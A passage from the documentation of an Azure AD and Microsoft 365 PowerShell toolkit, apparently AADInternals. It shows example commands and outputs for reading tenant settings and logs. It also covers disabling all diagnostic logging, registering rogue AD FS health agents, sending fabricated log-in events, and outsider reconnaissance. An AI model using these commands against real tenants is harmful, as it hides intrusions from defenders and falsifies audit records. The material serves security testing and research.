Gets some Azure Tenant information, including certain tenant settings and ALL domains. The access token MUST be stored to cache! Works also for <strong>guest users</strong>!</p>

<p>The Tenant is not required for Access Token but is recommended as some tenants may have MFA.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-Tenant</span> <span class="n">6e3846ee-e8ca</span><span class="p">-</span><span class="n">4609-a3ab-f405cfbd02cd</span> <span class="n">-SaveToCache</span>

<span class="c"># Show the information</span>
<span class="nb">Get-AADIntAzureInformation</span> <span class="n">-Tenant</span> <span class="n">6e3846ee-e8ca</span><span class="p">-</span><span class="n">4609-a3ab-f405cfbd02cd</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>objectId                                  : 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
displayName                               : Company Ltd
usersCanRegisterApps                      : True
isAnyAccessPanelPreviewFeaturesAvailable  : False
showMyGroupsFeature                       : False
myGroupsFeatureValue                      : 
myGroupsGroupId                           : 
myGroupsGroupName                         : 
showMyAppsFeature                         : False
myAppsFeatureValue                        : 
myAppsGroupId                             : 
myAppsGroupName                           : 
showUserActivityReportsFeature            : False
userActivityReportsFeatureValue           : 
userActivityReportsGroupId                : 
userActivityReportsGroupName              : 
showRegisteredAuthMethodFeature           : False
registeredAuthMethodFeatureValue          : 
registeredAuthMethodGroupId               : 
registeredAuthMethodGroupName             : 
usersCanAddExternalUsers                  : False
limitedAccessCanAddExternalUsers          : False
restrictDirectoryAccess                   : False
groupsInAccessPanelEnabled                : False
selfServiceGroupManagementEnabled         : True
securityGroupsEnabled                     : False
usersCanManageSecurityGroups              : 
office365GroupsEnabled                    : False
usersCanManageOfficeGroups                : 
allUsersGroupEnabled                      : False
scopingGroupIdForManagingSecurityGroups   : 
scopingGroupIdForManagingOfficeGroups     : 
scopingGroupNameForManagingSecurityGroups : 
scopingGroupNameForManagingOfficeGroups   : 
objectIdForAllUserGroup                   : 
allowInvitations                          : False
isB2CTenant                               : False
restrictNonAdminUsers                     : False
enableLinkedInAppFamily                   : 0
toEnableLinkedInUsers                     : {}
toDisableLinkedInUsers                    : {}
linkedInSelectedGroupObjectId             : 
linkedInSelectedGroupDisplayName          : 
allowedActions                            : @{application=System.Object[]; domain=System.Object[]; group=System.Object[]; serviceprincipal=System.Object[]; 
											tenantdetail=System.Object[]; user=System.Object[]; serviceaction=System.Object[]}
skuInfo                                   : @{aadPremiumBasic=False; aadPremium=False; aadPremiumP2=False; aadBasic=False; aadBasicEdu=False; aadSmb=False; 
											enterprisePackE3=False; enterprisePremiumE5=False}
domains                                   : {@{authenticationType=Managed; availabilityStatus=; isAdminManaged=True; isDefault=False; isDefaultForCloudRedirections=False; 
											isInitial=False; isRoot=True; isVerified=True; name=company.com; supportedServices=System.Object[]; forceDeleteState=; state=; 
											passwordValidityPeriodInDays=; passwordNotificationWindowInDays=}, @{authenticationType=Managed; availabilityStatus=; 
											isAdminManaged=True; isDefault=False; isDefaultForCloudRedirections=False; isInitial=True; isRoot=True; isVerified=True; 
											name=company.onmicrosoft.com;}...}
</code></pre>

<h3 id="get-aadintazuresigninlog-m">Get-AADIntAzureSignInLog (M)</h3>

<p>Since version 0.4.0 <br>
Returns the 50 latest entries from Azure AD sign-in log or single entry by id.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Show the log</span>
<span class="nb">Get-AADIntAzureSignInLog</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>createdDateTime              id                                   ipAddress      userPrincipalName             appDisplayName                   
---------------              --                                   ---------      -----------------             --------------                   
2020-05-25T05:54:28.5131075Z b223590e-8ba1-4d54-be54-03071659f900 199.11.103.31  admin@company.onmicrosoft.com Azure Portal                     
2020-05-29T07:56:50.2565658Z f6151a97-98cc-444e-a79f-a80b54490b00 139.93.35.110  user@company.com              Azure Portal                     
2020-05-29T08:02:24.8788565Z ad2cfeff-52f2-442a-b8fc-1e951b480b00 11.146.246.254 user2@company.com             Microsoft Docs                   
2020-05-29T08:56:48.7857468Z e0f8e629-863f-43f5-a956-a4046a100d00 1.239.249.24   admin@company.onmicrosoft.com Azure Active Directory PowerShell
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the information for a single entry </span>
<span class="nb">Get-AADIntAzureSignInLog</span> <span class="n">-EntryId</span> <span class="n">b223590e</span><span class="p">-</span><span class="n">8ba1</span><span class="p">-</span><span class="n">4d54-be54</span><span class="p">-</span><span class="n">03071659f900</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>id                                : b223590e-8ba1-4d54-be54-03071659f900
createdDateTime                   : 2020-05-25T05:54:28.5131075Z
userDisplayName                   : admin company
userPrincipalName                 : admin@company.onmicrosoft.com
userId                            : 289fcdf8-af4e-40eb-a363-0430bc98d4d1
appId                             : c44b4083-3bb0-49c1-b47d-974e53cbdf3c
appDisplayName                    : Azure Portal
ipAddress                         : 199.11.103.31
clientAppUsed                     : Browser
userAgent                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
...
</code></pre>

<h3 id="get-aadintazureauditlog-m">Get-AADIntAzureAuditLog (M)</h3>

<p>Since version 0.4.0 <br>
Returns the 50 latest entries from Azure AD sign-in log or single entry by id.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the Access Token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Show the log</span>
<span class="nb">Get-AADIntAzureAuditLog</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                                                            activityDateTime             activityDisplayName   operationType result  initiatedBy   
--                                                            ----------------             -------------------   ------------- ------  -----------   
Directory_9af6aff3-dc09-4ac1-a1d3-143e80977b3e_EZPWC_41985545 2020-05-29T07:57:51.4037921Z Add service principal Add           success @{user=; app=}
Directory_f830a9d4-e746-48dc-944c-eb093364c011_1ZJAE_22273050 2020-05-29T07:57:51.6245497Z Add service principal Add           failure @{user=; app=}
Directory_a813bc02-5d7a-4a40-9d37-7d4081d42b42_RKRRS_12877155 2020-06-02T12:49:38.5177891Z Add user              Add           success @{app=; user=}
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the information for a single entry </span>
<span class="nb">Get-AADIntAzureAuditLog</span> <span class="n">-EntryId</span> <span class="n">Directory_9af6aff3-dc09</span><span class="p">-</span><span class="n">4ac1-a1d3</span><span class="p">-</span><span class="n">143e80977b3e_EZPWC_41985545</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>id                  : Directory_9af6aff3-dc09-4ac1-a1d3-143e80977b3e_EZPWC_41985545
category            : ApplicationManagement
correlationId       : 9af6aff3-dc09-4ac1-a1d3-143e80977b3e
result              : success
resultReason        : 
activityDisplayName : Add service principal
activityDateTime    : 2020-05-29T07:57:51.4037921Z
loggedByService     : Core Directory
operationType       : Add
initiatedBy         : @{user=; app=}
targetResources     : {@{id=66ce0b00-92ee-4851-8495-7c144b77601f; displayName=Azure Credential Configuration Endpoint Service; type=ServicePrincipal; userPrincipalName=; 
					  groupType=; modifiedProperties=System.Object[]}}
additionalDetails   : {}
</code></pre>

<h3 id="remove-aadintazurediagnosticsettings-ac">Remove-AADIntAzureDiagnosticSettings (AC)</h3>

<p>Since version 0.4.5 <br>
Removes all diagnostic settings by disabling all logs.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove the diagnostic settings</span>
<span class="nb">Remove-AADIntAzureDiagnosticSettings</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintazurediagnosticsettings-ac">Get-AADIntAzureDiagnosticSettings (AC)</h3>

<p>Since version 0.4.5 <br>
Lists all diagnostic settings.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List diagnostic settings</span>
<span class="nb">Get-AADIntAzureDiagnosticSettings</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                        : Audit and SignIn to Sentinel
WorkspaceId                 : /subscriptions/a04293e7-46c8-4bf4-bc6d-1bc1f41afae0/resourcegroups/sentinel/providers/microsoft.operationalinsights/workspaces/MySentinel
StorageAccountId            : 
EventHubAuthorizationRuleId : 
EventHubName                : 
ServiceBusRuleId            : 

Name                        : Service Principal to Sentinel
WorkspaceId                 : /subscriptions/a04293e7-46c8-4bf4-bc6d-1bc1f41afae0/resourcegroups/sentinel/providers/microsoft.operationalinsights/workspaces/MySentinel
StorageAccountId            : 
EventHubAuthorizationRuleId : 
EventHubName                : 
ServiceBusRuleId            :
</code></pre>

<h3 id="get-aadintazurediagnosticsettingsdetails-ac">Get-AADIntAzureDiagnosticSettingsDetails (AC)</h3>

<p>Since version 0.4.5 <br>
Gets log settings of the given Azure workspace.</p>

<p><strong>Example:</strong> (continuing from the previous)
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List diagnostic settings for the given workspace</span>
<span class="nb">Get-AADAzureIntDiagnosticSettingsDetails</span> <span class="n">-Name</span> <span class="s2">"Audit and SignIn to Sentinel"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Log                          Enabled Retention Enabled Retention Days
---                          ------- ----------------- --------------
ProvisioningLogs               False             False              0
AuditLogs                      False             False              0
SignInLogs                     False             False              0
NonInteractiveUserSignInLogs   False             False              0
ServicePrincipalSignInLogs     False             False              0
ManagedIdentitySignInLogs       True              True            365
</code></pre>

<h3 id="set-aadintazurediagnosticsettingsdetails-ac">Set-AADIntAzureDiagnosticSettingsDetails (AC)</h3>

<p>Since version 0.4.5 <br>
Sets log settings for the given Azure workspace.</p>

<p><strong>Example:</strong> (continuing from the previous)
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Set the diagnostic log settings for the given workspace</span>
<span class="nb">Set-AADIntDiagnosticSettingsDetails</span> <span class="n">-Name</span> <span class="s2">"Audit and SignIn to Sentinel"</span> <span class="n">-Log</span> <span class="n">ManagedIdentitySignInLogs</span><span class="p">,</span><span class="n">AuditLogs</span><span class="p">,</span><span class="n">SignInLogs</span> <span class="n">-Enabled</span> <span class="nv">$true</span> <span class="n">-RetentionEnabled</span> <span class="nv">$true</span> <span class="n">-RetentionDays</span> <span class="n">365</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Log                          Enabled Retention Enabled Retention Days
---                          ------- ----------------- --------------
ProvisioningLogs               False             False              0
AuditLogs                       True              True            365
SignInLogs                      True              True            365
NonInteractiveUserSignInLogs   False             False              0
ServicePrincipalSignInLogs     False             False              0
ManagedIdentitySignInLogs       True              True            365
</code></pre>

<h3 id="get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog (AC)</h3>

<p>Since version 0.6.1 <br>
Gets Azure Directory Activity log events even from tenants without Azure subscription.</p>

<p><strong>Note:</strong> If the tenant doesn’t have Azure subscription, the user must have “Access management for Azure resources” switched on at
<a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Properties">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Properties</a> or use <a href="#grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Optional: grant Azure User Access Administrator role </span>
<span class="nb">Grant-AADIntAzureUserAccessAdminRole</span>

<span class="c"># Get the events for the last month</span>
<span class="nv">$events</span> <span class="p">=</span> <span class="nb">Get-AADIntAzureDirectoryActivityLog</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">31</span><span class="p">)</span>

<span class="c"># Select ADHybridHealthService related events and extract relevant information</span>
<span class="nv">$events</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">authorization</span><span class="p">.</span><span class="n">action</span> <span class="o">-like</span> <span class="s2">"Microsoft.ADHybrid*"</span><span class="p">}</span> <span class="p">|</span> <span class="p">%{</span><span class="nb">New-Object</span> <span class="n">psobject</span> <span class="n">-Property</span> <span class="p">(</span><span class="no">[ordered]</span><span class="p">@{</span><span class="s2">"Scope"</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">authorization</span><span class="p">.</span><span class="n">scope</span><span class="p">;</span><span class="s2">"Operation"</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">operationName</span><span class="p">.</span><span class="n">localizedValue</span><span class="p">;</span><span class="s2">"Caller"</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">caller</span><span class="p">;</span><span class="s2">"TimeStamp"</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">eventTimeStamp</span><span class="p">;</span><span class="s2">"IpAddress"</span><span class="p">=</span><span class="nv">$_</span><span class="p">.</span><span class="n">httpRequest</span><span class="p">.</span><span class="n">clientIpAddress</span><span class="p">})}</span> <span class="p">|</span> <span class="nb">ft</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Scope                                                                                    Operation          Caller                               TimeStamp IpAddress                  
-----                                                                                    ---------          ------                               --------- ---------         
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:59.0148112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:58.3348792Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:16.2093169Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:15.5693784Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:11.3219081Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:10.5819036Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:18.1500781Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:17.7750301Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.2797177Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.0297112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.9612649Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.7262514Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.4399245Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.2599207Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:00:00.5760736Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T14:59:53.6402357Z 152.219.25.6
</code></pre>

<h3 id="get-aadintazurewireserveraddress">Get-AADIntAzureWireServerAddress</h3>

<p>Since version 0.6.5 <br>
Gets Azure and Azure Stack WireServer ip address using DHCP. If DHCP query fails, returns the default address (168.63.129.16)</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get WireServer address</span>
<span class="nb">Get-AADIntAzureWireServerAddress</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>168.63.129.16
</code></pre>

<h2 id="hybrid-health-functions">Hybrid Health functions</h2>

<p>The following functions can be used to add new Hybrid Health services and agents, and to create &amp; send fake log-in events to Azure AD.</p>

<h3 id="new-aadinthybridhealthservice-ac">New-AADIntHybridHealthService (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Creates a new ADHybridHealthService</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Create a new AD FS service</span>
<span class="nb">New-AADIntHybridHealthService</span> <span class="n">-DisplayName</span> <span class="s2">"sts.company.com"</span> <span class="n">-Signature</span> <span class="s2">"sts.company.com"</span> <span class="n">-Type</span> <span class="n">AdFederationService</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>activeAlerts                             : 0
additionalInformation                    : 
createdDate                              : 2021-07-12T07:25:29.1009287Z
customNotificationEmails                 : 
disabled                                 : False
displayName                              : sts.company.com
health                                   : Healthy
lastDisabled                             : 
lastUpdated                              : 0001-01-01T00:00:00
monitoringConfigurationsComputed         : 
monitoringConfigurationsCustomized       : 
notificationEmailEnabled                 : True
notificationEmailEnabledForGlobalAdmins  : True
notificationEmails                       : 
notificationEmailsEnabledForGlobalAdmins : False
resolvedAlerts                           : 0
serviceId                                : 189c61bb-2c9c-4e86-b038-d0257c6c559e
serviceMembers                           : 
serviceName                              : AdFederationService-sts.company.com
signature                                : sts.company.com
simpleProperties                         : 
tenantId                                 : c5ff949d-2696-4b68-9e13-055f19ed2d51
type                                     : AdFederationService
originalDisabledState                    : False
</code></pre>

<h3 id="get-aadinthybridhealthservices-ac">Get-AADIntHybridHealthServices (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Gets ADHybridHealthServices</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the service names</span>
<span class="nb">Get-AADIntHybridHealthServices</span> <span class="n">-Service</span> <span class="n">AdFederationService</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">serviceName</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>serviceName                             
-----------                             
AdFederationService-sts.company.com     
AdFederationService-sts.fake.myo365.site
</code></pre>

<h3 id="remove-aadinthybridhealthservice-ac">Remove-AADIntHybridHealthService (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Removes an ADHybridHealthService</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove the service</span>
<span class="nb">Remove-AADIntHybridHealthService</span> <span class="n">-ServiceName</span> <span class="s2">"AdFederationService-sts.company.com"</span>
</code></pre></div>


<h3 id="new-aadinthybridhealthservicemember-ac">New-AADIntHybridHealthServiceMember (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Adds a new ADHybridHealthService member</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Create a new service member</span>
<span class="nb">New-AADIntHybridHealthServiceMember</span> <span class="n">-ServiceName</span> <span class="s2">"AdFederationService-sts.company.com"</span> <span class="n">-MachineName</span> <span class="s2">"MyServer"</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>lastReboot                              : 0001-01-01T00:00:00Z
lastDisabled                            : 
lastUpdated                             : 0001-01-01T00:00:00
activeAlerts                            : 0
resolvedAlerts                          : 0
createdDate                             : 2021-05-06T07:15:50.0087136Z
disabled                                : False
dimensions                              : 
additionalInformation                   : 
tenantId                                : 5b53828e-8e7b-42d1-a5f0-9b34bbd1844a
serviceId                               : 50abc8f3-243a-4ac1-a3fb-712054d7334b
serviceMemberId                         : 0fce7ce0-81a0-4bf7-87fb-fc787dfe13c2
machineId                               : e9f8357d-8a25-4cef-8c6b-f0b3c916ead5
machineName                             : MyServer
role                                    : 
status                                  : Healthy
properties                              : 
installedQfes                           : 
recommendedQfes                         : 
monitoringConfigurationsComputed        : 
monitoringConfigurationsCustomized      : 
osVersion                               : 
osName                                  : 
disabledReason                          : 0
serverReportedMonitoringLevel           : 
lastServerReportedMonitoringLevelChange :
</code></pre>

<h3 id="get-aadinthybridhealthservicemembers-ac">Get-AADIntHybridHealthServiceMembers (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Gets ADHybridHealthService members</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the service members</span>
<span class="nb">Get-AADIntHybridHealthServiceMembers</span> <span class="n">-ServiceName</span> <span class="s2">"AdFederationService-sts.company.com"</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">machineName</span><span class="p">,</span><span class="n">serviceMemberId</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>machineName serviceMemberId                     
----------- ---------------                     
SERVER      bec07a23-dd4a-4c80-8c92-9b9dc089f75c
PROXY       e4d72022-a268-4167-a964-1899b8baeaa5
</code></pre>

<h3 id="remove-aadinthybridhealthservicemember-ac">Remove-AADIntHybridHealthServiceMember (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Removes a ADHybridHealthService member</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Remove service member</span>
<span class="nb">Remove-AADIntHybridHealthServiceMember</span> <span class="n">-ServiceName</span> <span class="s2">"AdFederationService-sts.company.com"</span> <span class="n">-ServiceMemberId</span> <span class="n">329485ce</span><span class="p">-</span><span class="n">9b5b</span><span class="p">-</span><span class="n">4652-ba72-acc41a455e92</span>
</code></pre></div>


<h3 id="get-aadinthybridhealthservicemonitoringpolicies-ac">Get-AADIntHybridHealthServiceMonitoringPolicies (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Gets ADHybridHealthService monitoring policies.</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get an access token and save it to the cache:</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># List the monitoring policies</span>
<span class="nb">Get-AADIntHybridHealthServiceMonitoringPolicies</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>serviceType                       : AdFederationService
serviceId                         : 74b6a260-67a3-43ac-922f-ec7afe19649c
serviceMemberId                   : 52f7c09f-e6a4-41ff-b328-bb6a182e1aca
monitoringConfigurations          : {@{key=AadPremium; value=True}, @{key=MonitoringLevel; value=Full}}
propertiesExtractorClassName      : Microsoft.Identity.Health.Adfs.DataAccess.DataManager, Microsoft.Identity.Health.Adfs.DataAccess
dimensionTableEntityClassNameList : 
roleType                          : AdfsServer_2016
moduleConfigurations              : {@{agentService=ConnectorAgent; moduleName=adfs; properties=}, @{agentService=ConnectorAgent; moduleName=PowerShellCmdletMonitor; properties=}}

serviceType                       : AadSyncService
serviceId                         : 4ce7a4dd-0269-4ae1-a92c-88f381f11a33
serviceMemberId                   : fa657e9b-b609-470c-aa6a-9922d9f37e49
monitoringConfigurations          : {@{key=MonitoringLevel; value=Off}, @{key=StagingMode; value=False}, @{key=ConfigurationUploadInterval; value=240}, @{key=RunProfileResultUploadInterval; value=30}...}
propertiesExtractorClassName      : Microsoft.Identity.Health.AadSync.DataAccess.DataManager, Microsoft.Identity.Health.AadSync.DataAccess
dimensionTableEntityClassNameList : 
roleType                          : AadSync_AadConnectSync_1.0
moduleConfigurations              : {@{agentService=ConnectorAgent; moduleName=aadsync; properties=}}
</code></pre>

<h3 id="send-aadinthybridhealthserviceevents">Send-AADIntHybridHealthServiceEvents</h3>

<p>Since version 0.5.0 <br></p>

<p>Sends the given AD FS log-in events to Azure using ADHybridHealthService protocols.</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create an empty array</span>
<span class="nv">$events</span> <span class="p">=</span> <span class="p">@()</span>

<span class="c"># Add new event(s) to the array</span>
<span class="nv">$events</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">New-AADIntHybridHealtServiceEvent</span> <span class="n">-Server</span> <span class="s2">"Server"</span> <span class="n">-UPN</span> <span class="s2">"user@company.com"</span> <span class="n">-IPAddress</span> <span class="s2">"192.168.0.2"</span><span class="p">)</span>

<span class="c"># Get the agent information from the local AD FS server or proxy</span>
<span class="nv">$agentInfo</span> <span class="p">=</span> <span class="nb">Get-AADIntHybridHealthServiceAgentInfo</span>

<span class="c"># Send the events</span>
<span class="nb">Send-AADIntHybridHealthServiceEvents</span> <span class="n">-AgentInfo</span> <span class="nv">$agentInfo</span> <span class="n">-Events</span> <span class="nv">$events</span> 
</code></pre></div>


<h3 id="new-aadinthybridhealtserviceevent-ac">New-AADIntHybridHealtServiceEvent (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Creates a new ADHybridHealthService event with the given parameters.</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create an empty array</span>
<span class="nv">$events</span> <span class="p">=</span> <span class="p">@()</span>

<span class="c"># Add new event(s) to the array</span>
<span class="nv">$events</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">New-AADIntHybridHealtServiceEvent</span> <span class="n">-Server</span> <span class="s2">"Server"</span> <span class="n">-UPN</span> <span class="s2">"user@company.com"</span> <span class="n">-IPAddress</span> <span class="s2">"192.168.0.2"</span><span class="p">)</span>

<span class="c"># Get the agent information from the local AD FS server or proxy</span>
<span class="nv">$agentInfo</span> <span class="p">=</span> <span class="nb">Get-AADIntHybridHealthServiceAgentInfo</span>

<span class="c"># Send the events</span>
<span class="nb">Send-AADIntHybridHealthServiceEvents</span> <span class="n">-AgentInfo</span> <span class="nv">$agentInfo</span> <span class="n">-Events</span> <span class="nv">$events</span> 
</code></pre></div>


<h3 id="register-aadinthybridhealthserviceagent-ac">Register-AADIntHybridHealthServiceAgent (AC)</h3>

<p>Since version 0.5.0 <br></p>

<p>Creates a new ADHybridHealthService</p>

<p><strong>Example:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List the service names</span>
<span class="nb">Get-AADIntHybridHealthServices</span> <span class="n">-Service</span> <span class="n">AdFederationService</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">serviceName</span>
</code></pre></div>


<pre><code>serviceName                             
-----------                             
AdFederationService-sts.company.com     
AdFederationService-sts.fake.myo365.site
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Register a new AD FS server</span>
<span class="nb">Register-AADIntHybridHealthServiceAgent</span> <span class="n">-ServiceName</span> <span class="s2">"AdFederationService-sts.company.com"</span> <span class="n">-MachineName</span> <span class="s2">"ADFS01"</span> <span class="n">-MachineRole</span> <span class="n">AdfsServer_2016</span>
</code></pre></div>


<pre><code>Agent info saved to         "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json"
Client sertificate saved to "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.pfx"
</code></pre>

<h2 id="kill-chain-functions">Kill chain functions</h2>

<p>These functions are part of <a href="/aadkillchain/" target="_blank">AAD &amp; M365 Kill Chain</a>.</p>

<h3 id="invoke-aadintreconasoutsider">Invoke-AADIntReconAsOutsider</h3>

<p>Since version 0.4.0 <br></p>

<p>Starts tenant recon of the given domain. Gets all verified domains of the tenant and extracts information such as their type.</p>

